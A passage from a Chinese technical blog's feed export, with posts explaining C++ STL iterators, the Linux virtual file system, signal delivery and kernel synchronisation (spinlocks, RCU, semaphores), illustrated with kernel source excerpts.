style="text-align:left"><map></map></td></tr></tbody></table><h1>迭代器</h1><p>下面要说的迭代器从作用上来说是最基本的部分，可是理解起来比前两者都要费力一些。软件设计有一个基本原则，所有的问题都可以通过引进一个间接层来简化，这种简化在STL中就是用迭代器来完成的。概括来说，迭代器在STL中用来将算法和容器联系起来，起着一种黏和剂的作用。几乎STL提供的所有算法都是通过迭代器存取元素序列进行工作的，每一个容器都定义了其本身所专有的迭代器，用以存取容器中的元素。</p><p>迭代器部分主要由头文件<utility>,<iterator>和<memory>组成。<utility>是一个很小的头文件，它包括了贯穿使用在STL中的几个模板的声明，<iterator>中提供了迭代器使用的许多方法，而对于<memory>的描述则十分的困难，它以不同寻常的方式为容器中的元素分配存储空间，同时也为某些算法执行期间产生的临时对象提供机制,<memory>中的主要部分是模板类allocator，它负责产生所有容器中的默认分配器。</memory></memory></iterator></utility></memory></iterator></utility></p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/5ae627d/">http://home.meng.uno/articles/5ae627d/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      STL简介
STL（Standard Template Library，标准模板库)是惠普实验室开发的一系列软件的统称。它是由Alexander Stepanov、Meng Lee和David R Musser在惠普实验室工作时所开发出来的。现在虽说它主要出现在C中，但在被引入C之前该技术就已经存在了很长的一段时间。

STL的代码从广义上讲分为三类：algorithm（算法），container（容器）和 iterator（迭代器），几乎所有的代码都采用了模板类和模版函数的方式，这相比于传统的由函数和类组成的库来说提供了更好的代码重用机会。在C++标准中，STL被组织为下面的13个头文件： 
    
    </summary>
    
      <category term="Programming Language" scheme="http://home.meng.uno/categories/Programming-Language/"/>
    
    
      <category term="C++" scheme="http://home.meng.uno/tags/C/"/>
    
      <category term="STL" scheme="http://home.meng.uno/tags/STL/"/>
    
  </entry>
  
  <entry>
    <title>文件系统</title>
    <link href="http://home.meng.uno/articles/1b9c8662/"/>
    <id>http://home.meng.uno/articles/1b9c8662/</id>
    <published>2017-01-14T05:39:44.000Z</published>
    <updated>2020-12-02T01:46:15.000Z</updated>
    
    <content type="html"><![CDATA[<h1>虚拟文件系统（VFS）的思想和作用</h1><p>实际上，看到<strong>Virtaul</strong>，我们就应该想到VFS的作用，是虚拟出一个中间层，来实现某些部分的<strong>统一处理</strong>。实际上，VFS要解决的是，让应用能够“以一种通用的方式”，去访问不同类型的文件系统：</p><p><img src="http://www.meng.uno/images/%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/VFS.png" alt=""></p><p>可以看到，对于不同类型的文件系统、网络文件系统、伪文件系统，应用对它们的操作接口都是一致的,而底层的驱动则会完成实际的区分工作。</p><h1>通用文件模型</h1><p>VFS通过一个通用文件模型，来表示一个文件系统，它从顶层到底层，一共维护四个数据结构。这里我们通过磁盘文件系统来举例子说明：</p><ul>  <li>file：文件<strong>对象</strong>。如果一个进程要和一个对象进行交互，那么久要在访问期间存放一个文件对象在内核内存中。</li>  <li>dentry：目录项<strong>对象</strong>。用来存放目录项和对应文件链接信息，每个磁盘文件系统，都有特殊的方式，将该类信息存在磁盘上。</li>  <li>inode：索引节点<strong>对象</strong>。用来存放关于具体文件的一般信息，对基于磁盘的文件系统来说，通常对应于存放在磁盘上的文件控制块，其节点号唯一标识文件系统中的文件。</li>  <li>superblock：超级块<strong>对象</strong>。对应安装的文件系统的信息，他对应磁盘上的文件系统控制块。</li></ul><p><img src="http://www.meng.uno/images/%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/%E9%80%9A%E7%94%A8%E6%A8%A1%E5%9E%8B.png" alt=""></p><p>这张图反映出了在一次访问中，各个对象是如何参与到过程中去的。这里我为什么要把<strong>对象</strong>给加粗呢？VFS实际采用的是一种面向对象的方式（虽然它是用C语言写的）。每个object，都有一系列的“操作方式”，VFS为这些对象提供了“统一的”接口，而具体的文件系统则提供了千差万别的实现方式，这是由一个函数指针表来实现的。</p><h1>文件对象</h1><p>这里我们从文件对象开始说。如果留意进程的<code>task_struct</code>（定义在sched.h当中），你会发现一个<code>fs_struct</code>结构，以及一个<code>files_struct</code>结构。</p><p>其中<code>fs_struct</code>保存了当前点工作目录和根目录：</p><pre><code>struct fs_struct {int users;spinlock_t lock;seqcount_t seq;int umask;int in_exec;struct path root, pwd;};</code></pre><p>而<code>files_struct</code>结构则保存了当前进程所打开的所有文件，它们保存在<code>fdtable</code>中：</p><pre><code>struct fdtable {unsigned int max_fds;struct file __rcu **fd;      /* current fd array */unsigned long *close_on_exec;unsigned long *open_fds;struct rcu_head rcu;};</code></pre><p>当<code>open()</code>系统调用发生时，文件描述符实际上是fd中的下标。现在我们终于看到<code>file</code>结构了，这里我只列出了重要的部分：</p><pre><code>struct file {union {struct llist_nodefu_llist;struct rcu_head fu_rcuhead;} f_u;struct pathf_path;struct inode*f_inode;/* cached value */const struct file_operations*f_op;  struct mutexf_pos_lock;loff_tf_pos;} __attribute__((aligned(4)));</code></pre><p>这里，<code>loff_t</code>是平时我们用来在文件读写上用于定位的指针，显然这个值必须放在file当中，因为可能会有几个进程同时访问一个文件。<br> 而  <code>f_op</code>正反映出了“通用文件模型的”特点，它保存了文件操作的对应指针；这个值是在进程打开文件时，从文件索引节点中的i_fop中复制的。</p><p>当然在<code>file</code>中我们也看到了<code>dentry</code>和<code>inode</code>的影子：<code>f_path</code>包含了<code>dentry *</code>，而*f_indoe也是file的一个域，它们分别指向了对应文件点dentry对象和inode对象，我们将会在接下来对它们进行详细的说明。</p><h1>目录项对象</h1><p>在上一节中，我们知道了文件对象描述了应用和文件的联系。这里，目录项是用来描述具体的文件系统中的目录项的，他的作用是：<strong>用来快速找到一个路径，并且与文件相关联</strong>。假设进程需要查找一个路径，那么路径中的每一个分量，都会有一个目录项与之对应。并且，目录项会把每个分量和它对应的索引节点联系起来。<code>dentry</code>的定义如下：</p><pre><code>struct dentry {unsigned int d_flags;seqcount_t d_seq;struct hlist_bl_node d_hash;/* 哈希链表 */struct dentry *d_parent;/* 父目录项 */struct qstr d_name;/* 目录名 */struct inode *d_inode;/* 对应的索引节点 */unsigned char d_iname[DNAME_INLINE_LEN];/* small names */struct lockref d_lockref;/* per-dentry lock and refcount */const struct dentry_operations *d_op;/* dentry操作 */struct super_block *d_sb;/* 文件的超级块对象 */unsigned long d_time;void *d_fsdata;struct list_head d_lru;/* LRU list */struct list_head d_child;/* child of parent list */struct list_head d_subdirs;/* our children */union {struct hlist_node d_alias;/* inode alias list */ struct rcu_head d_rcu;} d_u;};  </code></pre><p>这里可以看到，除开自身的名称、引用计数等，目录项对象中有这些关键的结构：<code>d_op</code>描述了目录项所对应的操作（通用模型的特点）；<code>d_sb</code>则是 文件的超级块对象，至于<code>d_inode</code>则是这个目录项关联的索引节点（当然它们并不是一一对应的关系）。注意，这里还有个很重要的变量：<code>d_lockref</code>，它其实就是一个计数器，说明了这个目录项对象的引用次数。</p><p>目录项对象保存在<strong>dentry cache</strong>中。linux操作系统为了提高目录项对象的处理效率，设计了这个高速缓存。这是因为，从磁盘中读取目录项，并且构造相应的目录项对象是需要花费大量的时间的，因此，在完成对目录项对象的操作之后，在内存中（尽量）保存它们具有很重要的意义。这个dentry cache，其本质是一个哈希链表，它定义在list_bl.h当中（它的hash计算在<code>d_hash</code>中完成）。我注意到，对于每一个dentry，都有一个d_flags，它的可能的值，定义在dcache.h当中。因为dentry  cache的大小也是有限的，因此我们也不可能无限制地把dentry保存在cache中。因此linux首先把dentry的状态进行了定义：</p><ul>  <li>free：该状态目录项对象不包含有效信息，未被VFS使用</li>  <li>unused：目前没有被内核使用，d_count的值为0，d_inode仍然指向相关的索引节点</li>  <li>in use：正在被使用，d_count的值大于0，d_inode仍然指向相关的索引节点</li>  <li>negative：与目录项关联的索引节点不存在，相应的磁盘索引节点已经被删除（d_inode为负数）。</li></ul><p>那么对于unused和negative这一类目录项，linux使用了一个LRU（最近最少使用）的双向链表，一旦dentry cache的大小吃紧，就从这个LRU链表中删除dentry。</p><h1>索引节点对象</h1><p>索引节点对象，是VFS当中最为重要的一个数据结构。它的作用是<strong>表示文件的相关信息</strong>。这里的相关信息，不包括文件本身的内容，而是诸如文件大小、拥有者、创建时间等信息。在一个文件被首次访问时，内核会在内存中构造它的索引节点对象。我们在操作系统中，可以任意修改一个文件的名字，但是索引节点和文件是一一对应的（由索引节点号标识），只要文件存在它就会存在（注意，超级块对象和索引节点对象在硬盘上都是有对应的实体数据结构的，在使用时利用硬盘上的内容，在内存中构造索引节点对象）。目录项是用来找到一个对应的索引节点实体，而具体与文件关联的工作则是由索引节点完成的。</p><p>让我们来看看索引节点的数据结构（只取了重要的部分），其定义在fs.h当中：</p><pre><code>struct inode {    struct hlist_node    i_hash;     /* 散列表，用于快速查找inode */    struct list_head    i_list;        /* 相同状态索引节点链表 */    struct list_head    i_sb_list;  /* 文件系统中所有节点链表  */    struct list_head    i_dentry;   /* 目录项链表 */    unsigned long        i_ino;      /* 节点号 */    atomic_t        i_count;        /* 引用计数 */    unsigned int        i_nlink;    /* 硬链接数 */    uid_t            i_uid;          /* 使用者id */    gid_t            i_gid;          /* 使用组id */    struct timespec        i_atime;    /* 最后访问时间 */    struct timespec        i_mtime;    /* 最后修改时间 */    struct timespec        i_ctime;    /* 最后改变时间 */    const struct inode_operations    *i_op;  /* 索引节点操作函数 */    const struct file_operations    *i_fop;    /* 缺省的索引节点操作 */    struct super_block    *i_sb;              /* 相关的超级块 */    struct address_space    *i_mapping;     /* 相关的地址映射 */    struct address_space    i_data;         /* 设备地址映射 */    unsigned int        i_flags;            /* 文件系统标志 */    void            *i_private;             /* fs 私有指针 */    unsigned long i_state;};</code></pre><p>可以看到，inode同样采用了多个链表来保存。<code>i_hash</code>用来快速查找inode，<code>i_list</code>则是相同状态索引结点形成的双链表，这包含有未用索引节点链表，正在使用索引节点链表和脏索引节点链表等。</p><p><code>i_dentry</code>是所有使用该节点的dentry链表。值得注意的是，inode不仅仅包含了自身索引节点的操作函数<code>i_op</code>，还有指向（缺省）文件操作的指针<code>i_fop</code>。当然，inode还会和super_block有联系。</p><p><code>i_sb</code>是索引节点所在的超级块，而i_sb_list则是超级块中的所有节点的链表。</p><p>当在某个目录下创建、打开一个文件时，内核就会调用<code>create()</code>为这个文件创建一个inode。VFS通过inode的i_op-&gt;create()函数来完成这个工作；它将目录的inode、新打开文件的dentry、访问权限作为参数；<code>lookup()</code>函数用来查找指定文件的dentry，<code>link()</code>和<code>symlink()</code>分别用来创建硬链接和软链接。</p><h1>超级块对象</h1><p>与前面几类对象不同的是，超级块对象表述的内容更加庞大一些：它表示的是一个“已安装的文件系统”。它在文件系统安装时建立，在文件系统卸载时删除。其定义在fs.h当中，这里我只列举出了较为关键的域。</p><pre><code>struct super_block {        struct list_head        s_list;         //超级块链表的指针        dev_t                   s_dev;          //设备标识符        unsigned char           s_blocksize_bits;        unsigned long           s_blocksize;        loff_t                  s_maxbytes;     //文件的最长长度        struct file_system_type *s_type;        const struct super_operations   *s_op;  //超级块的操作        const struct dquot_operations   *dq_op;         const struct quotactl_ops       *s_qcop;        const struct export_operations *s_export_op;        unsigned long           s_flags;//安装标识        struct dentry           *s_root;//根目录的目录项        int                     s_count;        const struct xattr_handler **s_xattr;        struct list_head        s_inodes;       //所有的inodes链（打开文件的inodes链）        struct block_device     *s_bdev;//块设备      char s_id[32];                          //块设备名称        u8 s_uuid[16];                          //UUID        fmode_t                 s_mode;        char *s_subtype;        const struct dentry_operations *s_d_op; //default d_op for dentries        void *s_fs_indo; //文件系统的信息指针    };</code></pre><p>在linux中，每个超级块代表一个已安装的文件系统。所有的超级块链表，是以一种双向环形链表的形式链接在一起的。其<code>prev</code>、<code>next</code>保存在<code>list_head</code>域中。超级块对象中，保存有其根目录的<code>dentry</code>，以及其所有的<code>inode</code>。<code>s_fs_info</code>则指向了文件系统的超级块信息。而对于超级块来说，同样定义有<code>s_op</code>，也即超级块的操作表。</p><p>超级块一般是储存在磁盘的特定扇区当中，但如果是基于内存对文件系统，比如proc、sysfs，则是保存在内存当中，而超级块对象，则是在使用时创建的，它保存在内存中。</p><h1>硬链接和软链接与复制</h1><p>linux里面，可以把文件分成三个部分：文件名（dentry），inode，数据。</p><p>复制的定义很明确，就是为这三个部分，都创建一个新的副本。</p><ul>  <li>硬链接的本质是一个“文件名”，一个文件可能有多个“文件名”，inode并不包含文件名，而只是有一个索引节点号。硬链接实际上就是为链接文件创建一个新的dentry，并将dentry写入父目录的数据中，而硬链接所对应的inode依然没有变。所以删除硬链接只是删除了dentry，而inode结点数减少1而已。</li>  <li>软链接就是一个普通的文件，只不过它的数据保存的是另一个文件的路径。软链接的创建，调用了<code>__ext4_new_inode()</code>来创建一个新的inode，并把<code>dentry-&gt;name</code>作为了它的内容。也就是说，软链接也同时创建了这三个部分。</li></ul><p>二者的区别在哪里呢？首先，硬链接共享了inode，因此它不能跨文件系统；但是软链接不受这个限制。由于相同的原因，硬链接只能对存在的文件进行创建，而软链接不是。而且硬链接有可能会在目录中引入循环，所以不能指向目录；但软链接不会，因为它有一个inode实体可以跟踪。不过不论删除软链接还是硬链接，都不会对原文件、具有相同inode号的文件造成影响。但如果原文件被删除，软链接会变成死链接，硬链接不会，因为inode的计数并没有变成0。</p><p><img src="http://www.meng.uno/images/%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/%E9%93%BE%E6%8E%A5.png" alt=""></p><h1>路径名查找</h1><p>每当进程需要识别一个文件时，就把它的文件路径名，传递给某个VFS系统调用，比如<code>open()</code>。在路径查找中，有个辅助的数据结构：<code>nameidata</code>，它用来向函数传递参数，并且保存查找的结果：</p><pre><code>struct nameidata {struct pathpath;struct qstrlast;struct pathroot;struct inode*inode; /* path.dentry.d_inode */unsigned intflags;unsignedseq, m_seq;intlast_type;unsigneddepth;struct file*base;char *saved_names[MAX_NESTED_LINKS + 1];};</code></pre><p>在查找完成后，<code>path</code>中保存了目录项，<code>depth</code>表示了当前路径的深度，<code>saved_names</code>保存了符号链接处理中的路径名。</p><p>路径查找的复杂性，主要体现在VFS系统的一些特点上：（1）必须对目录的访问权限进行检查；（2）文件名可能是符号链接；（3）要考虑符号链接可能带来的循环引用；（4）文件名可能是文件系统的安装点（5）路径名和进程的命名空间有关等。</p><p>路径名查找的入口是<code>path_lookup()</code>，它调用了<code>filename_lookup()</code>。这个函数对nameidata进行了简单的填充，随后调用<code>lookupat()</code>。</p><p><code>lookupat()</code>函数中通过一个循环，和<code>path_init()</code>函数，逐级向下进行查找，检查目录的访问权限，并且考虑符号链接等情况。</p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/1b9c8662/">http://home.meng.uno/articles/1b9c8662/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      虚拟文件系统（VFS）的思想和作用
实际上，看到Virtaul，我们就应该想到VFS的作用，是虚拟出一个中间层，来实现某些部分的统一处理。实际上，VFS要解决的是，让应用能够“以一种通用的方式”，去访问不同类型的文件系统：



可以看到，对于不同类型的文件系统、网络文件系统、伪文件系统，应用对它们的操作接口都是一致的,而底层的驱动则会完成实际的区分工作。

通用文件模型
VFS通过一个通用文件模型，来表示一个文件系统，它从顶层到底层，一共维护四个数据结构。这里我们通过磁盘文件系统来举例子说明：

 * file：文件对象。如果一个进程要和一个对象进行交互，那么久要在访问期间存放一个文件对象在
    
    </summary>
    
      <category term="Operation System" scheme="http://home.meng.uno/categories/Operation-System/"/>
    
    
      <category term="Linux" scheme="http://home.meng.uno/tags/Linux/"/>
    
      <category term="文件系统" scheme="http://home.meng.uno/tags/%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>信号</title>
    <link href="http://home.meng.uno/articles/1d60a972/"/>
    <id>http://home.meng.uno/articles/1d60a972/</id>
    <published>2017-01-12T05:26:36.000Z</published>
    <updated>2020-12-02T02:04:41.000Z</updated>
    
    <content type="html"><![CDATA[<h1>信号</h1><p>信号用来通知进程异步事件，可以把它理解为对中断的一种模拟。它是一个很小的消息，用来达到两个目的：</p><ul>  <li>告知进程发生了一个特定的事件；</li>  <li>强迫进程执行自身所包含的信号处理程序。</li></ul><p>linux预先定义了一些常规信号，并为它们定义了一些缺省操作。除此之外，还有一类实时信号，它们需要排队进行处理，我们也可以自己定义信号和信号处理方式。</p><p>既然信号是和进程相关的，那么<code>task_struct</code>中就必然包含有与信号相关的域了。</p><pre><code>task_struct{...struct signal_struct *signal;//进程信号描述符struct sighand_struct *sighand;//进程信号处理程序描述符sigset_t blocked;//被阻塞信号掩码sigset_t real_bloced;//被阻塞信号临时掩码struct sigpending pending;//存放私有挂起信号...}</code></pre><p><img src="http://www.meng.uno/images/%E8%BF%9B%E7%A8%8B/%E4%BF%A1%E5%8F%B7.gif" alt=""></p><h1>信号的产生</h1><p>信号是由内核函数产生的，它们完成信号处理的第一步，也即更新一个/多个进程的描述符。产生的信号并不直接传递，而是根据信号的类型、目标进程的状态唤醒进程，让它们来接收信号。内核提供了一组产生信号的函数，包括为进程、线程组产生信号等，但它们最终都会调用<code>__send_signal()</code>。当然，在调用<code>__send_signal()</code>之前，会检查这个信号是否应该被忽略（进程没有被跟踪、信号被阻塞，显示忽略信号）</p><pre><code>static int __send_signal(int sig, struct siginfo *info, struct task_struct *t,int group, int from_ancestor_ns){struct sigpending *pending;struct sigqueue *q;int override_rlimit;int ret = 0, result;assert_spin_locked(&amp;t-&gt;sighand-&gt;siglock);result = TRACE_SIGNAL_IGNORED;if (!prepare_signal(sig, t,from_ancestor_ns || (info == SEND_SIG_FORCED)))goto ret;//获取进程或线程组的私有挂起队列pending = group ? &amp;t-&gt;signal-&gt;shared_pending : &amp;t-&gt;pending;//这个信号已经挂起了，忽略它result = TRACE_SIGNAL_ALREADY_PENDING;if (legacy_queue(pending, sig))goto ret;result = TRACE_SIGNAL_DELIVERED;//如果是kernel内部的某些强制信号，就立马执行if (info == SEND_SIG_FORCED)goto out_set;//如果没有超过挂起信号的上限if (sig &lt; SIGRTMIN)override_rlimit = (is_si_special(info) || info-&gt;si_code &gt;= 0);elseoverride_rlimit = 0;//产生一个sigqueue对象，并把它加入到队列中去q = __sigqueue_alloc(sig, t, GFP_ATOMIC | __GFP_NOTRACK_FALSE_POSITIVE,override_rlimit);if (q) {list_add_tail(&amp;q-&gt;list, &amp;pending-&gt;list);switch ((unsigned long) info) {case (unsigned long) SEND_SIG_NOINFO:q-&gt;info.si_signo = sig;q-&gt;info.si_errno = 0;q-&gt;info.si_code = SI_USER;q-&gt;info.si_pid = task_tgid_nr_ns(current,task_active_pid_ns(t));q-&gt;info.si_uid = from_kuid_munged(current_user_ns(), current_uid());break;case (unsigned long) SEND_SIG_PRIV:q-&gt;info.si_signo = sig;q-&gt;info.si_errno = 0;q-&gt;info.si_code = SI_KERNEL;q-&gt;info.si_pid = 0;q-&gt;info.si_uid = 0;break;default:copy_siginfo(&amp;q-&gt;info, info);if (from_ancestor_ns)q-&gt;info.si_pid = 0;break;}//......}</code></pre><p>在信号产生之后，linux会调用<code>signal_wake_up()</code>通知进程，告知有新的挂起信号到来，如果当前进程占有了CPU，那么就可以立即执行；否则则要强制进行重新调度。</p><h1>信号的传递</h1><p>在信号产生之后，如何确保挂起的信号被正确的处理呢？进程在信号产生时，可能并不在CPU上运行。在进程恢复用户态执行时，会进行检查，如果存在非阻塞的挂起信号，就调用<code>do_signal()</code>，这个函数会逐个助理挂起的非阻塞信号，而信号的处理则进一步调用<code>handle_signal()</code>。</p><pre><code>handle_signal(struct ksignal *ksig, struct pt_regs *regs){bool stepping, failed;struct fpu *fpu = &amp;current-&gt;thread.fpu;//是否处于系统调用中if (syscall_get_nr(current, regs) &gt;= 0) {//系统调用被打断了，没有执行完，需要重新执行switch (syscall_get_error(current, regs)) {case -ERESTART_RESTARTBLOCK:case -ERESTARTNOHAND:regs-&gt;ax = -EINTR;break;case -ERESTARTSYS:if (!(ksig-&gt;ka.sa.sa_flags &amp; SA_RESTART)) {regs-&gt;ax = -EINTR;break;}/* fallthrough */case -ERESTARTNOINTR:regs-&gt;ax = regs-&gt;orig_ax;regs-&gt;ip -= 2;break;}}//设置栈帧failed = (setup_rt_frame(ksig, regs) &lt; 0);if (!failed) {regs-&gt;flags &amp;= ~(X86_EFLAGS_DF|X86_EFLAGS_RF|X86_EFLAGS_TF);/* * Ensure the signal handler starts with the new fpu state. */if (fpu-&gt;fpstate_active)fpu__clear(fpu);}signal_setup_done(failed, ksig, stepping);}</code></pre><p>这里存在一个问题：<code>handle_signal()</code>处于内核态中，但信号处理程序是在用户态定义的，因此这里存在着堆栈转换的问题。linux采用的方法是：把内核态堆栈中的硬件上下文，拷贝到当前进程的用户态堆栈中。而当信号处理程序完成时，会自动调用<code>sigreturn()</code>把硬件上下文拷贝回内核态堆栈中，并且恢复用户态堆栈中的内容。这里需要构造一个用户态栈帧：</p><p><img src="http://www.meng.uno/images/%E8%BF%9B%E7%A8%8B/%E6%A0%88.gif" alt=""></p><p>首先内核需要把内核栈中的内容复制到用户态堆栈中去，把内核态堆栈的返回地址修改为信号处理程序的入口。注意，为了让信号处理程序结束时，能够清除栈上的内容，用户态堆栈还应该放入一个信号处理程序的返回地址，它指向<code>__kernel_sigreturn()</code>，把硬件上下文拷贝到内核态堆栈，然后把这个栈帧删除，随后从内核态返回到用户态继续执行。</p><h1>信号的接口</h1><p><code>kill</code>/<code>tkill</code>/<code>kgill</code>系统调用分别用来给某个进程、线程组发送信号。其中，<code>kill(pid, sig)</code>分别接受一个进程的pid号，以及一个所发送的信号。</p><p>实时信号的发送则应该使用<code>rt_sigqueueinfo()</code>来进行发送。如果用户需要为信号指定一个操作，那么则应该使用<code>sigaction(sig, &amp;act, &amp;oact)</code>系统调用，<code>act</code>为指定的操作，而<code>old_act</code>用来记录以前的信号。</p><p><br><br>本文链接： <a href="http://home.meng.uno/articles/1d60a972/">http://home.meng.uno/articles/1d60a972/</a> 欢迎转载！</p>]]></content>
    
    <summary type="html">
    
      信号
信号用来通知进程异步事件，可以把它理解为对中断的一种模拟。它是一个很小的消息，用来达到两个目的：

 * 告知进程发生了一个特定的事件；
 * 强迫进程执行自身所包含的信号处理程序。

linux预先定义了一些常规信号，并为它们定义了一些缺省操作。除此之外，还有一类实时信号，它们需要排队进行处理，我们也可以自己定义信号和信号处理方式。

既然信号是和进程相关的，那么task_struct中就必然包含有与信号相关的域了。

task_struct{
	...
	struct signal_struct *signal;		//进程信号描述符
	struct sighand_struct *
    
    </summary>
    
      <category term="Operation System" scheme="http://home.meng.uno/categories/Operation-System/"/>
    
    
      <category term="Linux" scheme="http://home.meng.uno/tags/Linux/"/>
    
      <category term="信号" scheme="http://home.meng.uno/tags/%E4%BF%A1%E5%8F%B7/"/>
    
  </entry>
  
  <entry>
    <title>内核同步</title>
    <link href="http://home.meng.uno/articles/e41a0c57/"/>
    <id>http://home.meng.uno/articles/e41a0c57/</id>
    <published>2017-01-10T05:11:05.000Z</published>
    <updated>2020-12-02T01:51:07.000Z</updated>
    
    <content type="html"><![CDATA[<h1>内核同步</h1><p>对于内核，其实有一个很形象的理解：我们可以把内核理解成一个服务器，它为自身和用户提供各种服务。因此它必须要保证每项服务在处理时，不会互相造成影响，也就是解决“并发”的问题。自身的请求，也即中断；客户的请求，也即用户态的系统调用或异常。内核的同步，就是对内核中的任务进行调度，使它们按照正确的方式运行。</p><h1>内核抢占</h1><p>这里，“内核抢占”指的是进程A在内核态运行时，被具有更高优先级的进程B取代，也就是发生了<strong>进程上下文的切换</strong>。而我们知道，中断上下文是不包括进程信息的，不能被调度。所以只要在中断上下文中，就不能进行“进程切换”。因此硬中断和软中断在执行时都不允许内核抢占；只有在内核执行异常处理程序（尤其是系统调用），并且内核抢占没有被显示禁用时，才能进行内核抢占。CPU必须打开本地中断，才能完成内核抢占。</p><p>从另一个角度来说，CPU在任何情况下，都处于三种上下文情况之一：</p><ul>  <li>运行在用户空间，执行用户进程；</li>  <li>运行在内核空间，处于进程上下文；</li>  <li>运行在内核空间，处于中断上下文。</li></ul><p>在关于中断的博文里，我已经写过，中断上下文是不属于任何进程的，它和<code>current</code>没有任何关系。由于没有任何进程背景，在中断上下文中也不能发生睡眠，否则是不能对它进行调度。<strong>因此中断上下文中只能用锁进行同步，中断上下文也叫做原子上下文</strong>。而异常和系统调用陷入内核时，是出于进程上下文的，因此可以通过<code>current</code>关联相应的任务。所以在进程上下文中，可以发生睡眠，也可以使用信号量；当然也可以使用锁。</p><p>ps：以上说的是内核抢占的情况；用户抢占指的是另一个概念，指的是内核即将返回用户空间的时候，如果<code>need_resched</code>标志被设置，就会调用<code>schedule()</code>，选择一个更为合适的进程运行。</p><p>内核不能被抢占的情况有这些：</p><ul>  <li>内核正在进行中断处理。在linux下，进程不能抢占中断（注意，中断是可以抢占、中止其他中断的），中断历程中不允许进行进程调度（<code>schedule()会进行判断，如果在中断中会报错</code>）。这也包括软中断的Bottom half部分。</li>  <li>当前的代码段持有自旋锁、读写锁，这些锁<strong>保证SMP系统CPU并发的正确性</strong>，此时不能进行抢占。</li>  <li>内核正在执行调度程序时，不应该进行抢占。</li>  <li>内核正在对每CPU数据进行操作。</li></ul><p>除此之外的情况，都可以发生内核抢占。</p><h1>每CPU变量</h1><p>把内核变量，声明为每个CPU所独有的，它是数组结构的数组，每个CPU对应数组的一个元素，CPU直接不能访问其他CPU对应的数组元素，只能读写自身的元素，因此也不会出现竞争条件。但这同样存在着限制：必须确定CPU上的数据是各自独立的。</p><p>但是每CPU变量不能解决内核抢占的问题，他只能解决多CPU的问题，因此在访问时应当禁用抢占。</p><h1>原子操作</h1><p>通过保证操作在芯片上是原子级的，保证“读－修改－写”指令不会引发竞争。任何一个这样的操作，都必须以单个指令执行，并且不能中断，避免其他CPU访问这个单元。除了常见的0或1次对齐内存访问的汇编指令、单处理器下的“读－修改－写”指令、前缀为lock的指令也是原子操作指令。</p><h1>优化和内存屏障</h1><p>优化屏障主要是用来保证编译时，汇编语言指令按照原顺序来执行，而不进行重排。例如在linux中，<code>barrier()</code>的本质就是<code>asm volatile(&quot;&quot;:::&quot;memory&quot;)</code>。而内存屏障则是保证原语前后的指令执行顺序，也即在执行原语后的指令时，原语前的指令必须已经执行完了。</p><h1>自旋锁</h1><p>自旋锁是一类特别广泛使用的同步技术，如果内核控制路径必须访问共享数据结构，或者访问临界区，那么就需要为自己获取一个自旋锁；只有资源是空闲时，获取才能成功；当它释放了锁之后，其他内核控制路径就可以进入房间了。那么自旋锁的意义是什么？它是多处理器环境下一种特殊的锁；如果执行路径发现自旋锁是锁着的，或反复在周围进行“旋转”，反复执行循环，直到锁被释放（忙等）。</p><p>自旋锁保护的临界区通常是禁止内核抢占的，如果在单CPU环境下，自旋锁仅仅能够禁止或启用内核抢占，并不能起到锁的作用。当然，忙等时还是可以被抢占的，只有上锁后才会禁止抢占。</p><p>ps：阿里巴巴的面试官问过我一个问题，**自旋锁的本质是什么？**我当时猜测了一下，回答了原子操作，但没有能够进一步地进行解释。这里应该结合源码进行说明。可以看到对<code>xadd</code>就是一个标准的源子加操作。linux内核使用了两种实现。其一是“标签自旋锁”，<code>raw_spin_lock</code>最后会调用：</p><pre><code> static inline void __raw_spin_lock(raw_spinlock_t *lock) {    preempt_disable();//禁止了抢占    spin_acquire(&amp;lock-&gt;dep_map, 0, 0, _RET_IP_);    LOCK_CONTENDED(lock, do_raw_spin_trylock, do_raw_spin_lock); } arch_spin_lock(arch_spinlock_t *lock) { register struct __raw_tickets inc = {.tail = TICKET_LOCK_INC};//这个值是0 inc = xadd(&amp;lock-&gt;tickets, inc);//xadd是原子加，在多CPU时会上锁 //获取标签，同时把序号＋1   if(likely(inc.head == inc.tail))//标签到自己了，取锁成功了 goto out; for(;;){//否则就不断循环，直到轮到自己 unsigned count = SPIN_THRESHOLD;  do{ inc.head = READ_ONCE(lock-&gt;tickets.head); if(__tickets_equal(inc.head, inc.tail))//判断是否到自己的标签了 goto clear_slowpath; cpu_relax(); }while(--count); __ticket_lock_spinning(lock, inc.tail); } clear_slowpath: __ticket_check_and_clear_slowpath(lock, inc.head); cout: barrier(); }  arch_spinlock_t的结构如下，实际上就是一个u16数 typedef struct arch_spinlock {          union {                  __ticketpair_t head_tail;                  struct __raw_tickets {                          __ticket_t head, tail;                  } tickets;          };  } arch_spinlock_t; </code></pre><p>另一种是一种更加复杂的实现，被称为“排队自旋锁”。排队自旋锁基于每CPU变量实现，其实现比基于标签对实现更公平。</p><h1>读－拷贝－更新</h1><p>用来保护在多数情况下，被多个CPU读的数据结构，而设计的另一种同步技术，其特点是允许多个读和写并发执行，并且不使用锁。那么它如何在共享数据读前提下，实现同步呢？RCU只保护被动态分配，并且通过指针引用的数据结构，并且在RCU临界区内，禁止睡眠。RCU的做法是，在写操作时，拷贝一份原来的副本，在副本上进行修改，并且在修改完成后进行更新，将旧的指针更新为新的指针。</p><h1>信号量</h1><p>在linux中，有两种信号量，一种是给内核使用的内核信号量，另一种是给用户态进程使用的IPC信号量。这里我们只讨论内核信号量。其实信号量和自旋锁在“上锁”这一点上是类似的，如果锁关闭了，那么就不允许内核控制路径继续执行；只不过它不会像自旋锁一样，在原地“忙等”，而是将相应的进程挂起；只有资源可用了，进程才能继续运行。也正因为“睡眠”的特性，信号量<strong>不能用在中断处理程序和延迟处理函数</strong>上，只有允许睡眠的情况下，才能够使用信号量。</p><p><strong>内核</strong>信号量的定义在semaphore.h当中：</p><pre><code>struct semaphore {     raw_spinlock_t          lock;//保护信号量的自旋锁     unsigned int            count;     struct list_head        wait_list;};</code></pre><p>很神奇的，这里看到了<code>raw_spinlock_t</code>的影子。这其实是一个由Real-time 